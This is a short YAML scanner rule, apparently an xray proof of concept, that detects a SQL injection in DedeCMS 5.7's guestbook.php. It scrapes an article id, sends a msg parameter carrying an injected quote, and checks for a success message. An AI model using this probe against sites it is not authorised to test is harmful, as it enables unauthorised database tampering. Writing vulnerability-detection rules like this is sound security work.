name: poc-yaml-dedecms-guestbook-sqli
rules:
  - method: GET
    path: /plus/guestbook.php
    follow_redirects: true
    expression: |
      response.status == 200
    search: action=admin&id=(?P<articleid>\d{1,20})
  - method: GET
    path: /plus/guestbook.php?action=admin&job=editok&msg=errs.cc'&id={{articleid}}
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(b"\xb3\xc9\xb9\xa6\xb8\xfc\xb8\xc4\xbb\xf2\xbb\xd8\xb8\xb4\xd2\xbb\xcc\xf5\xc1\xf4\xd1\xd4") || response.body.bcontains(b"成功更改或回复一条留言")
  - method: GET
    path: /plus/guestbook.php
    follow_redirects: true
    expression: |
      response.status == 200 && !response.body.bcontains(bytes("errs.cc"))

detail:
  author: harris2015(https://github.com/harris2015)
  Affected Version: "5.7"
  links:
    - https://blog.csdn.net/god_7z1/article/details/8180454
